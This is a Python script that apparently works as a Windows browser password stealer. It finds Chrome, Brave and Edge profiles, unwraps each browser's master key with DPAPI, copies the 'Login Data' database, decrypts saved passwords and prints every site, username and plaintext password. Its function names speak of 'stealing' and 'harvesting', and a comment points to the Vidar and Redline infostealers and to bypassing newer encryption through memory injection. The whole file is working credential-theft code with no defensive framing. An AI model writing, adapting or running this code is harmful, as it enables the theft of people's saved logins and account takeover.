import os, json, base64, sqlite3, shutil
import sys

path = os.path.join(sys.prefix, 'Lib', 'site-packages', 'pywin32_system32')
os.environ['PATH'] = path + os.pathsep + os.environ['PATH']
sys.path.append(os.path.join(sys.prefix, 'Lib', 'site-packages', 'win32'))
sys.path.append(os.path.join(sys.prefix, 'Lib', 'site-packages', 'win32', 'lib'))

import win32crypt
from Cryptodome.Cipher import AES # Need pycryptodome

BROWSER_PATHS = {
    "Chrome": os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data"),
    "Brave": os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data"),
    "Edge": os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data")
}

def get_master_key(path):
    local_state_path = os.path.join(path, "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.load(f)
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_v10(data, key):
    iv = data[3:15]
    payload = data[15:]
    cipher = AES.new(key, AES.MODE_GCM, iv)
    return cipher.decrypt(payload)[:-16].decode()

def steal_from_path(name, path):
    print(f"\n--- Harvesting {name} ---")
    key = get_master_key(path)
    # Browsers often use "Default" or "Profile 1", "Profile 2"
    profiles = ["Default", "Profile 1", "Profile 2"]
    
    for profile in profiles:
        login_db = os.path.join(path, profile, "Login Data")
        if not os.path.exists(login_db): continue
        
        temp_db = "temp.db"
        shutil.copyfile(login_db, temp_db)
        
        db = sqlite3.connect(temp_db)
        cursor = db.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        
        for url, user, password in cursor.fetchall():
            if password.startswith(b'v10'):
                dec_pass = decrypt_v10(password, key)
            elif password.startswith(b'v20'):
                # ADVANCED: Vidar/Redline bypass v20 via Memory Injection
                dec_pass = "[v20 Encrypted - Requires Elevation]"
            else:
                dec_pass = "[Legacy DPAPI]"
            
            print(f"[{name}] {url} | {user} | {dec_pass}")
            
        db.close()
        os.remove(temp_db)

if __name__ == "__main__":
    for name, path in BROWSER_PATHS.items():
        if os.path.exists(path):
            steal_from_path(name, path)
